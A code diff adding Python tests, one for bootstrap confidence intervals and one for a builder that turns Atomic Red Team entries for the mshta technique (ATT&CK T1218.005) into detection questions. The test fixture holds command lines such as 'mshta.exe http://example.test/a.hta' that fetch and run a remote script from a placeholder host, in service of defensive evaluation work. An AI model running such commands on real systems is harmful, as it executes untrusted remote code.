@@ -79,3 +79,50 @@ def test_embedding_prefixes():
     assert embedding_prefixes("intfloat/multilingual-e5-small") == ("query: ", "passage: ")
     assert embedding_prefixes("BAAI/bge-m3") == ("", "")
     assert embedding_prefixes("sentence-transformers/all-MiniLM-L6-v2") == ("", "")
+
+
+def test_bootstrap_ci_and_paired_difference():
+    from metrics import bootstrap_ci, paired_bootstrap
+
+    scores = [1.0] * 80 + [0.0] * 20
+    lo, hi = bootstrap_ci(scores)
+    assert lo < 0.8 < hi and 0.70 < lo and hi < 0.90
+    assert bootstrap_ci(scores) == (lo, hi)  # seeded, reproducible
+    assert bootstrap_ci([1.0] * 10) == (1.0, 1.0)
+
+    # two questions out of 100 differ: the interval must contain 0
+    other = [1.0] * 78 + [0.0] * 22
+    d, dlo, dhi = paired_bootstrap(scores, other)
+    assert abs(d - 0.02) < 1e-9 and dlo <= 0.0 <= dhi
+
+
+def test_alert_question_builder(tmp_path):
+    import build_alert_questions as b
+
+    d = tmp_path / "T1218.005"
+    d.mkdir()
+    (d / "T1218.005.yaml").write_text(
+        """attack_technique: T1218.005
+atomic_tests:
+- name: leaks the label
+  supported_platforms: [windows]
+  executor: {name: command_prompt, command: 'mshta.exe C:\\\\AtomicRedTeam\\\\T1218.005\\\\x.hta'}
+- name: has setup lines
+  supported_platforms: [windows]
+  executor: {name: powershell, command: "$a = 1\\nmshta.exe $a http://example.test/a.hta"}
+- name: linux only
+  supported_platforms: [linux]
+  executor: {name: sh, command: 'echo this is long enough to pass the filter'}
+- name: good
+  auto_generated_guid: g-1
+  supported_platforms: [windows]
+  input_arguments: {url: {default: 'http://example.test/a.hta'}}
+  executor: {name: command_prompt, command: 'mshta.exe #{url}'}
+""",
+        encoding="utf-8",
+    )
+    qs = b.build(tmp_path)
+    assert len(qs) == 1 and qs[0]["gold_ids"] == ["attack:T1218.005"]
+    assert "mshta.exe http://example.test/a.hta" in qs[0]["question"]
+    assert qs[0]["type"] == "alert_atomic" and qs[0]["atomic_guid"] == "g-1"
+    assert b.build(tmp_path, known={"attack:T1059"}) == []
